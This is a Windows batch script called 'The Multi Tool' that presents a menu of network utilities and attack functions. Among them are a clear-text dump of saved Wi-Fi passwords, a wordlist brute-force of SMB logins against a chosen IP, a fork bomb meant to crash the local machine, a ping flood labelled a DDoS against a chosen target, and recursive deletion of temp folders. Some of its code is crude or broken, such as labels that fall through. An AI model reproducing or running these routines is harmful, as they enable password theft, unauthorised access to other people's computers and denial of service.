@echo off
rem MULTI TOOL V2
title The Multi Tool
chcp 65001 
:start
cls
color A
echo.
echo.
echo.
echo		       ████████╗██╗  ██╗███████╗    ████████╗ ██████╗  ██████╗ ██╗     
echo                ╚══██╔══╝██║  ██║██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
echo                   ██║   ███████║█████╗         ██║   ██║   ██║██║   ██║██║     
echo                   ██║   ██╔══██║██╔══╝         ██║   ██║   ██║██║   ██║██║     
echo                   ██║   ██║  ██║███████╗       ██║   ╚██████╔╝╚██████╔╝███████╗
echo                   ╚═╝   ╚═╝  ╚═╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                                                                                                                                                                                                                                

echo.
echo.
echo.                                                                                                                                                         
echo.
echo.
echo.
color A
echo 1) your network info
echo 2) know what the network password is  
echo 3) brute force attack on a computer
echo 4) Devices info
echo 5) crush the computer
echo 6) crush a targeted computer -- Ddos attack
echo 7) geolocate this pc (for remote control purpuses)
echo 8) get your computer work afap
set /p op="Please choose a command: "

if "%op%"=="1" (
	timeout 3
    goto :a
)
if "%op%"=="2" (
    goto :b
)
if "%op%"=="3" (
    goto :c
)
if "%op%"=="4" (
    goto :d
)
if "%op%"=="5" (
    goto :e
)
if "%op%"=="6" (
    goto :f
)
if "%op%"=="7" (
    goto :g
)
if "%op%"=="8" (
    goto :h
)
if not "%op%"=="1" if not "%op%"=="2" if not "%op%"=="3"if not "%op%"=="4"if not "%op%"=="5"if not "%op%"=="6"if not "%op%"=="7" if not "%op%"=="8" (
	cls
	echo Please enter a good number
	timeout 3
    goto :start
)

:b
cls
netsh wlan show profiles
echo.

set /p net="Enter the network you want to know the password for: "
echo.

setlocal EnableDelayedExpansion

timeout 1


cls
color 4
netsh wlan show profile "%net%" key=clear | find "Key"



pause
cls
goto start


:a
echo.
echo.
echo.
echo.
echo.

color 4


for /f "tokens=2 delims=:" %%a in ('netsh wlan show interface ^| find "SSID" ^| findstr /v "BSSID"') do set ssid=%%a
for /f "tokens=2 delims=:" %%a in ('netsh wlan show interface ^| find "Description"') do set des=%%a
for /f "tokens=2 delims=:" %%a in ('netsh wlan show interface ^| find "State"') do set state=%%a
for /f "tokens=2 delims=:" %%a in ('netsh wlan show interface ^| find "Signal"') do set sig=%%a

for /f "tokens=2 delims= " %%a in ('netstat -e ^| find "Bytes"') do set rbyte=%%a
for /f "tokens=3 delims= " %%a in ('netstat -e ^| find "Bytes"') do set sbyte=%%a
ping -n 3 8.8.8.8>%temp%\ping.txt
for /f "tokens=4 delims==" %%a in ('type %temp%\ping.txt ^| find "Average"') do set ping=%%a
for /f "tokens=10 delims= " %%a in ('type %temp%\ping.txt ^| find "Lost"') do set lost=%%a
cls
echo.
echo.
echo Network
echo --------------
echo SSID:%ssid%
echo Description:%des%
echo State:%state%
echo Signal Strenght:%sig%

echo.
echo --------------
echo.
echo Speed
echo.
echo --------------
echo Ping:%ping%
echo Bytes Received: %rbyte%
echo Bytes Sent: %sbyte%
echo Lost:%lost%
echo.
echo.
echo.

pause
goto :start



:c
cls
title The Brute Force
color A
echo.
setlocal enabledelayedexpansion
set /a count=1

:: input from the user
set /p ip="Enter IP Target: "
set /p user="Enter Target Username: "
set /p wordlist="Enter Password List: "


color 4
for /f %%a in (%wordlist%) do (
    set pass=%%a
    call :attempt
)

echo Password not Found :(
pause
goto :start

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
goto :start

:attempt

net use \\%ip% /user:%user% !pass! >nul 2>&1

:: אם חיבור הצליח, עבור להצלחה
if %errorlevel% EQU 0 goto success


echo [Attempt %count%] : [!pass!]
set /a count=%count%+1



:d
cls
color 4
echo.
echo.
echo.
echo ----------------
route print | findstr /C:"Interface List" /C:"......"

echo -----------------
for /l %%i in (1,1,254) do @ping -n 1 192.168.1.%%i ^| find "Reply">nul
arp -a | findstr "dynamic"
echo -----------------
net view
echo -----------------
pause
goto :start


:e
cls
color 4
set /p name="Are you sure?????(y/n)"
if /I "%name%" == "y" (
    goto :loop
)
if /I "%name%" == "n" (
    
    goto :start
)


:loop
start
goto loop

:f
cls
echo.
echo.
echo.
set /p target="Enter target IP or domain: "
color 4
timeout 3
echo are you ready
cls
for /l %%i in (1,1,100000000000000000000000000000000000000000000000000000000000000000) do (
    ping -n 1 -l 65500 %target% >nul
    echo [HACKING IN PROGGRESS]
)
:g
cls
setlocal enabledelayedexpansion>nul
color 4
for /f %%a in ('curl ifconfig.me') do set ss=%%a>nul
echo.
echo.
echo.
echo YOUR PUBLIC IP IS: %ss%
echo.    
echo YOUR LOCATION IS CLOSE TO THIS 
echo.
curl ipinfo.io/%ss%
pause
:h
cls
ipconfig /flushdns>nul
del /s /q C:\Windows\Temp\*>nul
del /s /q %temp%\*>nul
rd /s /q C:\Windows\Temp
mkdir C:\Windows\Temp

color 4
echo.
echo.
echo.
echo.
echo                                                        YOUR PC MAY RUN FASTER
echo.
echo.
echo.
echo.
pause
goto :start







